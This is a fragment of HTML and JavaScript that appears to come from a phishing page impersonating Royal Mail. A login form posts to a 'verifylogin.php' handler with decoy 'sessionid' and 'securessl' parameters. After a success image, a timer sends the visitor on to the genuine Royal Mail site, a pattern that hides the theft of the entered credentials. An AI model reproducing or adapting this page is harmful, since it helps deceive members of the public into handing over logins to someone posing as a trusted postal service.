...
var timer = setTimeout(function() {
      window.location='https://www.royalmail.com/services-near-you#/'
  }, 3000);
</script>
    ...
    <div class="row">
      <div class="login-form-column">
        <form class="user-login-form" data-drupal-selector="user-login-form" data-msg-required="This field is required." action="verifylogin.php?&sessionid=$hash&securessl=true" method="POST" id="user-login-form" accept-charset="UTF-8" autocomplete="off">
          ...
          <center><img style="width: 130px;height: 130px;" class="img-fluid sms-mid-image mt-4" src="files/img/success.gif" /></center>
          <!--
